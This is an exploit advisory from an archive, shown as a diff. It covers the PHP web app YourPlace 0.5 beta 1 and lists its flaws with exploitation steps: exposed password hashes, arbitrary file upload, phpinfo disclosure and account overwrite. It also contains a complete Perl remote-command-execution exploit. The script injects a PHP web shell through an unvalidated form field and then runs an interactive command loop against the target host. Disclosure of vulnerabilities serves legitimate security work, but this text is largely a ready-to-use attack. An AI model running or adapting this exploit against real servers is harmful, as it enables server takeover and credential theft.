@@ -1,0 +1,236 @@
+[START]
+
+############################################################################################################################################
+[0x01] Informations:
+
+Script         : YourPlace 0.5 (beta 1)
+Download       : http://www.hotscripts.com/jump.php?listing_id=80545&jump_type=1
+Vulnerability  : DB Disclosure / Arbitrary Data Saving (RCE EXPLOIT) / Arbitrary File Upload / PHPInfo Disclosure / User Change Account
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Website        : http://osirys.org
+Notes          : Proud to be Italian
+Greets:        : XaDoS, x0r, emgent, Jay, str0ke, Todd and AlpHaNiX
+
+* This script has also other vulnerability. Here you can find just the major ones !
+  I wrote a simple RCE Exploit also.
+
+
+############################################################################################################################################
+[0x02] Bug: [Database Disclosure]
+######
+
+Vulnerable file is: /[path]/user/info/users.txt
+
+This script uses a .txt file to store usernames and passwords.
+
+### [!] EXPLOIT:
+                 1) Go at: /[path]/user/info/users.txt
+                 2) Get username and password !
+                 ex: osirys	$1$H9mfzCTo$gbuasEowB1agfEqWolcGR.
+                     username   password crypted with crypt function
+
+
+############################################################################################################################################
+[0x03] Bug: [Arbitrary Data Saving] ## RCE EXPLOIT !!
+######
+
+Bugged file is: /[path]/internettoolbar/edit.php
+
+To exploit this vulnerability, we must be logged in.
+
+[CODE]
+
+				$fav5_url = $_POST['fav5_url'];
+				$fav1_name = $_POST['fav5_name'];
+				
+				$write = "<? \n &#36;homepage = '".$homepage."';\n \n 
+									&#36;fav1_url = '".$fav1_url."';\n
+									&#36;fav1_name = '".$fav1_name."';\n \n
+									&#36;fav2_url = '".$fav2_url."';\n
+									&#36;fav2_name = '".$fav2_name."';\n \n
+									&#36;fav3_url = '".$fav3_url."';\n
+									&#36;fav3_name = '".$fav3_name."';\n \n
+									&#36;fav4_url = '".$fav4_url."';\n
+									&#36;fav4_name = '".$fav4_name."';\n \n
+									&#36;fav5_url = '".$fav5_url."';\n
+									&#36;fav5_name = '".$fav5_name."';\n \n ?>";
+									
+				$write = str_replace('&#36;','$',$write);
+				$fp = fopen("../user/internettoolbar/index.php", "w+");
+				$fw = fwrite($fp, $write);
+
+[/CODE]
+
+All the $fav variables come from POST. There is any cheek on what the user put in the form of $fav vars.
+Then the script will save the value of this vars in /[path]/user/internettoolbar/index.php.
+So we can put an evil php code ;)
+I wrote a simple exploit, a simple proof of concept, change it in your own way ;)
+This exploit can be adapted to your own needs.
+
+############################################################
+##########################################
+## Remote Command Execution Perl Exploit
+
+[code]
+
+#!/usr/bin/perl
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+my $path      = "/internettoolbar/edit.php";
+my $exec_path = "/user/internettoolbar/index.php";
+my $c0de      = "lol.it';?><?php system(\$_GET['cmd']);'";
+my $host      = $ARGV[0];
+
+
+($host) || help("-1");
+cheek($host) == 1 || help("-2");
+&banner;
+
+print "[+] Connecting to $host ..\n";
+print "[+] Writing hell php code ..\n";
+
+my $url = $host.$path;
+
+my $ua = LWP::UserAgent->new;
+my $post = $ua->post($url,
+                          [
+                            fav1_url => $c0de,
+                            do       => submit
+                          ]);
+
+if ($post->is_success) {
+    print "[+] Commands:\n";
+    print "    exit         -> quit the exploit \n";
+    print "    your command -> exec your cmd    \n";
+    &exec_cmd;
+}
+else {
+    print "[-] Can't write hell code !\n";
+    exit(0);
+}
+
+sub exec_cmd {
+    print "shell[Osirys]$>\n";
+    $cmd = <STDIN>;
+    $cmd !~ /exit/ || die "[-] Quitting ..\n";
+    $exec_url = ($host.$exec_path."?cmd=".$cmd);
+    $re = query($exec_url);
+    if ($re =~ /\?>(.*)/) {
+        print "[*] $1\n";
+        &exec_cmd;
+    }
+    else {
+        print "[-] Undefined output or bad cmd !\n";
+        &exec_cmd;
+    }
+}
+
+sub query() {
+    $link = $_[0];
+    my $req = HTTP::Request->new(GET => $link);
+    my $ua = LWP::UserAgent->new();
+    $ua->timeout(4);
+    my $response = $ua->request($req);
+    return $response->content;
+}
+
+sub cheek() {
+    my $host = $_[0];
+    if ($host =~ /http:\/\/(.*)/) {
+        return 1;
+    }
+    else {
+        return 0;
+    }
+}
+
+sub banner {
+    print "\n".
+          "  ============================ \n".
+          "     YourPlace RCE Exploit     \n".
+          "      Coded by Osirys          \n".
+          "      osirys[at]live[dot]it    \n".
+          "      Proud to be italian      \n".
+          "  ============================ \n\n";
+}
+
+sub help() {
+    my $error = $_[0];
+    if ($error == -1) {
+        &banner;
+        print "\n[-] Cheek that you typed the hostname address and the command to execute !\n";
+    }
+    elsif ($error == -2) {
+        &banner;
+        print "\n[-] Bad hostname address !\n";
+    }
+    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
+    exit(0);
+}
+
+[/CODE]
+
+
+############################################################################################################################################
+[0x04] Bug: [Arbitrary File Upload]
+######
+
+Bugged file is: /[path]/apps/standard/upload.php
+
+To upload our local file we must be logged in. Then we can upload any file.
+The bug here is to allow user to upload file of any extensions, in fact there isn't any extension cheek.
+
+
+### [!] EXPLOIT: 
+                 1) Go at: /[path]/apps/standard/upload.php
+                 2) Upload your local file.
+                 3) Cheek it here: /[path]/user/uploads/your_file.your_ext
+
+
+############################################################################################################################################
+[0x05] Bug: [PHPInfo Disclosure]
+######
+
+Vulnerable file is: /[path]/user/uploads/phpinfo.php
+
+
+### [!] EXPLOIT:
+                 1) Go at /[path]/user/uploads/phpinfo.php
+                 2) Get php information
+
+
+############################################################################################################################################
+[0x06] Bug: [User Change Account]
+######
+
+Bugged file is: /[path]/login/register.php
+
+[CODE]
+
+if (isset ($_POST['submit'])) {
+	$fp = fopen ( '../user/info/users.txt', 'w+' );
+	
+	if ($fp){
+		$data = $_POST['username']."\t".crypt($_POST['password'])."\r\n";
+		fwrite ( $fp, $data );
+		fclose ( $fp );
+		echo ":-)";
+	}
+
+[/CODE]
+
+Registering a new user, the old one will be deleted.
+
+
+### [!] EXPLOIT: Go at: /[path]/login/register_form.php
+                 Register your new user
+
+
+############################################################################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-22]
